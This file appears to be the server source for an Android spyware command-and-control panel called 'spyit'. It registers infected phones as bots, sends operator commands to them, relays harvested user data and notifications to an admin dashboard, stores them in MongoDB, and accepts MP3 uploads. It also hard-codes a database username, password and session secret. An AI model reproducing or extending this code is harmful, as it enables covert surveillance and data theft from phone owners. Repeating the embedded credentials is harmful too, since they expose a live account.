var express = require('express');
var socket = require('socket.io');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const fileStore = require('session-file-store')(session)
const morgan = require('morgan');
const serveIndex = require('serve-index');
const utils = require('./utils/serverUtils');

var saveNotificationToDb = require('./notifications/notificationHandler').saveNotificationToDb;

mongoose.connect('mongodb://spyit:spyit%40123@ds163387.mlab.com:63387/spyit', { useNewUrlParser: true, useUnifiedTopology: true })
const db = mongoose.connection
db.on('error', (error) => console.error(error))
db.once('open', () => console.log('connected to database'))

const port = 4000;
var app = express();    //App Setup
app.use('/public', express.static(__dirname + '/SClientSide/Dashboard')); //Static Files
app.use('/uploads', express.static(__dirname + '/uploads'), serveIndex(__dirname + '/uploads', {icons: true}));
app.use(bodyParser.json())
app.use(morgan('dev'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.use(session({
    key:'user_sid',
    secret:'$PY17@123',
    saveUninitialized:false,
    resave:false,
    cookie: {
        expires: 12 * 60 * 60 * 1000
    },
    store:new fileStore()
}))

app.use((req, res, next) => {
    if (req.cookies.user_sid && !req.session.user) {
        res.clearCookie('user_sid');        
    }
    next();
});

const notificationsRouter = require('./routes/notifications');
const workerLogsRouter = require('./routes/workerLogs');
const onPauseRouter = require('./routes/onPause');
const submitmp3Router = require('./routes/submitmp3');
const loginRouter = require('./routes/login');
const dashboardRouter = require('./routes/dashboard');
const logoutRouter = require('./routes/logout');

app.use('/', dashboardRouter);
app.use('/notifications', notificationsRouter);
app.use('/workerlogs', workerLogsRouter);
app.use('/pause', onPauseRouter);
app.use('/submitmp3', submitmp3Router);
app.use('/login', loginRouter);
app.use('/logout', logoutRouter);


var server = app.listen(port, function () {
    console.log('Listening to port: ', port);
});


//Socket setup
var io = socket(server);
io.on('connection', function (socket) {
    handleSocket(socket);
});


//Handle socket
var adminSocket;
var botSocketList = {};
var botDataList = {};

function handleSocket(socket) {

    //Register admin and save socket instance to global adminSocket variable
    socket.on('registerAdmin', function (data) {
        // console.log("SOCKET= ", socket);
        socket.tag = "admin";
        adminSocket = socket;
        console.log(data);
        console.log("An admin connected: " + socket.id);

        //Send bot connected + data to web client i.e., list of all connected devices
        adminSocket.emit('registerBotClient', botDataList);

        //Send command to device i.e., bot
        handleWebClientCommand(socket);
    });

    //To register a bot and send data to web client
    socket.on('bot-login', function (data) {
        console.log(data);
        socket.tag = data.uid;
        socket.email = data.email;
        botSocketList[data.uid] = socket;
        botDataList[data.uid] = data;
        console.log("A bot connected: " + socket.id);

        //socket.emit('commands', [{command: 'openBrowser', arg1: "google.com"}]);

        //Send bot connected + data to web client i.e., list of all connected devices
        if (adminSocket != null && adminSocket.connected)
            adminSocket.emit('registerBotClient', botDataList);


        //Send bot data to web client when bot send any userdata
        handleUserData(socket);

    });

    //Fired up when any socket is disconnected
    socket.on('disconnect', function () {
        console.log(socket.tag + " disconnected");
        console.log("Before deleting data object: ", botDataList);

        if (socket.tag && socket.tag!=='admin' && botSocketList[socket.tag] && !botSocketList[socket.tag].connected){ // Deleteing from socket and data list, 
            delete botDataList[socket.tag];         // only if present socket is not connected 
            delete botSocketList[socket.tag];

            if (adminSocket != null && adminSocket.connected)
                adminSocket.emit('offlineBot', socket.tag);
        }
        console.log('After deleting data object: ', botDataList);
    });
}


function handleWebClientCommand(socket) {

    //Send commands to bot i.e., android phone
    socket.on('commands', function (data) {
        let botSocket = botSocketList[data.uid];
        if (botSocket && botSocket.connected){
            botSocket.emit('commands', data.commands);
            console.log('Command firing to bot server ' + data.commands);
        }
        else{
            console.log('Bot is not connected :-(');
        }
    });
}

function handleUserData(socket) {

    //Receive and send data to web client from bot
    socket.on('usrData', function (data) {
        if (adminSocket != null && adminSocket.connected)
            adminSocket.emit('usrData', {data: data, uid: socket.tag});
        console.log('User data uploading');
    });

    socket.on('notificationPosted', async function (data) {
        data.data = data.data.map((notif) => {
            notif.ts = utils.convertToIST(notif.ts);
            return notif
        })
        if (adminSocket != null && adminSocket.connected)
            adminSocket.emit('notification', {data: data.data, uid: socket.tag});
        console.log('Notification Data : ', data);
        // console.log("Type of data notification data is: ", typeof(data));
        await saveNotificationToDb(data);
    });

    socket.on("clientError", function(data){
        console.log(data);
    });

}

module.exports = {
    botSocketList: botSocketList,
};